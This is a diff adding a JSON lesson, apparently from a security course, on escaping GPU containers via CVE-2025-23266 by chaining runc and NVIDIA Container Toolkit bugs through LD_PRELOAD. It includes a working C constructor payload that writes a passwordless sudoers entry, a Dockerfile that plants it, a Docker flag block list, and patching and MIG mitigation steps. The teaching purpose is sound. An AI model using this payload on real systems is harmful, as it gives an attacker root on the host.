@@ -1,0 +1,59 @@
+{
+  "slug": "09-gpu-container-escape",
+  "title": "GPU Container Escape",
+  "type": "content",
+  "readingtime": "12 min read",
+  "difficulty": "Advanced",
+  "sections": [
+    {
+      "type": "content",
+      "body": "# GPU Container Escape\n\nThis is the deepest attack in the module. Here we break out of a container entirely and take over the host machine — using a weakness unique to **GPU** systems. This is advanced, so we build it up slowly.\n\n## What Is a Container Escape?\n\nNormally, a container is a sealed box. Code inside cannot touch the host machine or other containers. That isolation is the whole point of containers.\n\nA **container escape** is when an attacker breaks out of that box and gains control of the host machine itself.\n\n**Analogy:** A container is like a hotel room. You can use everything inside, but you cannot walk into other rooms or the manager's office. A container escape is finding a secret door that leads straight into the manager's office (the host), where you control the whole building.\n\n## Why GPUs Create a Special Risk\n\nHere is the crucial fact. The Linux kernel isolates CPU and memory very well using a feature called **cgroups**. But cgroups has **no GPU controller**.\n\nThat means GPU isolation is *not* handled by the battle-tested kernel. Instead, it is handled by **userspace software** — specifically the **NVIDIA Container Toolkit**.\n\n**Why this matters:** userspace software is easier to have bugs in than the kernel. So the GPU is a thinner, weaker wall than the CPU/memory walls. A bug there can lead straight to the host."
+    },
+    {
+      "type": "content",
+      "body": "## The Building Blocks\n\nLet's define the pieces involved in this attack.\n\n| Term | Simple Meaning |\n|---|---|\n| **GPU** | Special chip that makes AI math fast |\n| **NVIDIA Container Toolkit** | Software that gives containers GPU access |\n| **runc** | The low-level program that actually starts containers |\n| **OCI hook** | A script that runs at a specific moment during container startup |\n| **LD_PRELOAD** | A Linux trick that forces a program to load your library first |\n| **Constructor** | Code in a library that runs automatically when loaded |\n\n## What Is LD_PRELOAD?\n\nThis needs its own explanation because it is the heart of the attack.\n\nWhen a Linux program starts, it loads shared libraries. **LD_PRELOAD** is an environment variable that says: *\"Before loading anything else, load THIS library first.\"*\n\nIf your library has a **constructor** function, that function runs automatically the moment the library loads — before the real program even starts.\n\n**Analogy:** LD_PRELOAD is like slipping your own instructions into the front of someone's to-do list. They do your task first, automatically, before their real work."
+    },
+    {
+      "type": "content",
+      "body": "## The Vulnerability: CVE-2025-23266\n\nThis real attack chains **two bugs** together. Let's explain each simply.\n\n### Bug 1: runc Leaks Environment Variables\n\nOlder versions of `runc` (up to 1.2.6) copy the *container's* environment variables into `runc`'s **own** environment before running startup hooks. This means an attacker-controlled variable (like `LD_PRELOAD`) ends up polluting a trusted host process.\n\n### Bug 2: the Toolkit Hook Inherits That Environment\n\nThe NVIDIA Container Toolkit (versions 1.17.0–1.17.7) runs a startup hook that, due to a coding mistake, **inherits the parent's environment** instead of starting clean. So it picks up the poisoned `LD_PRELOAD`.\n\n### Chaining Them Together\n\n1. Attacker sets `LD_PRELOAD` inside a container image, pointing to their malicious library.\n2. `runc` copies that variable into its own environment (Bug 1).\n3. The toolkit hook runs and inherits `LD_PRELOAD` (Bug 2).\n4. The hook runs **as root on the host**, and the dynamic linker loads the attacker's library first.\n5. The library's constructor runs **as root, on the host** — full escape."
+    },
+    {
+      "type": "diagram",
+      "src": "flowchart TD\n    A[1. Attacker sets LD_PRELOAD in image ENV] --> B[2. docker run starts]\n    B --> C[3. runc copies env to itself - Bug 1]\n    C --> D[4. Toolkit hook inherits env - Bug 2]\n    D --> E[5. Hook runs as ROOT on host]\n    E --> F[6. Malicious library loads first]\n    F --> G[7. Constructor runs as root = ESCAPE]\n    style A fill:#4f8cff,color:#fff\n    style G fill:#ef4444,color:#fff"
+    },
+    {
+      "type": "content",
+      "body": "## Why Wrapper Scripts Fail to Stop It\n\nOrganizations often protect Docker with **wrapper scripts** that block dangerous flags like `--privileged` or volume mounts. Something like:\n\n```bash\n# Wrapper blocks these dangerous flags:\n--privileged        # BLOCKED\n--pid=host          # BLOCKED\n--cap-add           # BLOCKED\n-v / --volume       # BLOCKED\n```\n\nHere is the clever part: **this attack does not use any of those flags.** The malicious `LD_PRELOAD` lives inside the **Dockerfile** (in an `ENV` directive), not on the command line. The wrapper only checks command-line flags, so it never sees the threat. The exploit fires during *container creation*, before the container even runs."
+    },
+    {
+      "type": "content",
+      "body": "## The Exploit Pieces\n\nThe attacker needs three small things. First, a tiny malicious library with a constructor that grants them root:\n\n```c\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <stdlib.h>\n\n__attribute__((constructor))\nstatic void init(void) {\n    unsetenv(\"LD_PRELOAD\");   // prevent recursive loading\n    FILE *f = fopen(\"/etc/sudoers.d/escalate\", \"w\");\n    if (f) {\n        fprintf(f, \"attacker ALL=(ALL) NOPASSWD: ALL\\n\");\n        fclose(f);\n    }\n}\n```\n\nSecond, a three-line Dockerfile that plants the `LD_PRELOAD`:\n\n```dockerfile\nFROM busybox\nENV LD_PRELOAD=/proc/self/cwd/payload.so\nADD payload.so /\n```\n\nThird, they build and run it through the *approved* wrapper — which happily allows it because no blocked flags appear."
+    },
+    {
+      "type": "content",
+      "body": "## GPU Memory: a Second Risk\n\nBeyond escape, GPUs have another problem: **residual memory**.\n\nWhen a program uses GPU memory (VRAM) and finishes, the data is often **not wiped**. The next program to use that memory can sometimes read the leftovers.\n\n**Analogy:** it is like renting a locker at the gym. If the previous user's belongings are not cleared out, you open the locker and find their stuff.\n\nIn multi-tenant AI (where different customers share one GPU), this could leak:\n\n- Another tenant's model weights\n- Sensitive input data\n- Intermediate computations\n\nThis is why **hardware isolation** (like NVIDIA MIG) matters for shared GPUs."
+    },
+    {
+      "type": "content",
+      "body": "## Hardware-Level Isolation\n\nModern GPUs offer real isolation at the silicon level to fix these gaps.\n\n| Technology | Vendor | What it does |\n|---|---|---|\n| **MIG** (Multi-Instance GPU) | NVIDIA (A100+) | Splits one GPU into isolated slices |\n| **SR-IOV** | Intel | Hardware-enforced VM-level isolation |\n| **Spatial partitioning** | AMD (MI300X) | Isolated chiplet regions |\n\n**MIG** is the most common. It carves one physical GPU into separate instances with their own compute, memory, and cache — so tenants cannot see each other. Older GPUs (Turing, Volta) lack this and remain riskier for multi-tenant use."
+    },
+    {
+      "type": "code",
+      "language": "bash",
+      "body": "# VULNERABLE setup: outdated toolkit + runc, cuda-compat-mode = hook\n# Check versions (these match CVE-2025-23266):\ndpkg-query -W nvidia-container-toolkit    # 1.17.7-1  (vulnerable range)\nrunc --version                            # 1.2.6     (vulnerable)\ngrep cuda-compat-mode /etc/nvidia-container-runtime/config.toml\n# cuda-compat-mode = \"hook\"   <-- vulnerable configuration\n\n# The wrapper only blocks CLI flags, so an ENV-based\n# LD_PRELOAD exploit sails right through."
+    },
+    {
+      "type": "code",
+      "language": "bash",
+      "body": "# SECURE setup: patch, disable the vulnerable hook, add isolation\n\n# 1. Update the NVIDIA Container Toolkit to a patched version (>= 1.17.8)\nsudo apt-get update && sudo apt-get install --only-upgrade nvidia-container-toolkit\n\n# 2. Update runc to a fixed release (>= 1.2.7)\n#    (via your container runtime package updates)\n\n# 3. Disable the vulnerable CUDA compat hook if not needed\nsudo sed -i 's/cuda-compat-mode = \"hook\"/cuda-compat-mode = \"disabled\"/' \\\n  /etc/nvidia-container-runtime/config.toml\n\n# 4. For multi-tenant GPUs, enable hardware isolation (MIG on A100+)\nsudo nvidia-smi -mig 1\n\n# 5. Do not grant users sudo access to Docker wrappers that build\n#    arbitrary images; scan images for suspicious ENV directives.\n\n# Why better: removes both bugs, adds hardware isolation, and\n# reduces the trust placed in wrapper scripts."
+    },
+    {
+      "type": "note",
+      "body": "**Big-picture lesson:** GPU isolation lives in *userspace*, not the kernel. That makes it inherently weaker than CPU/memory isolation. Keep the GPU runtime stack patched, prefer hardware isolation (MIG) for shared GPUs, and never assume a container is fully sealed just because dangerous flags are blocked."
+    },
+    {
+      "type": "content",
+      "body": "## Key Takeaways\n\n- A **container escape** breaks out of the container to control the host.\n- GPUs are risky because their isolation is handled in **userspace**, not the kernel.\n- **CVE-2025-23266** chains a `runc` bug and a toolkit bug via **LD_PRELOAD**.\n- The exploit hides in the **Dockerfile ENV**, bypassing flag-checking wrappers.\n- **Residual GPU memory** can leak data between tenants sharing a GPU.\n- **Defense:** patch runc and the toolkit, disable the vulnerable hook, use **MIG** for hardware isolation, and limit who can build/run images.\n\nNext, we shift fully to the blue-team side with **Defenses & Mitigations.**"
+    }
+  ]
+}
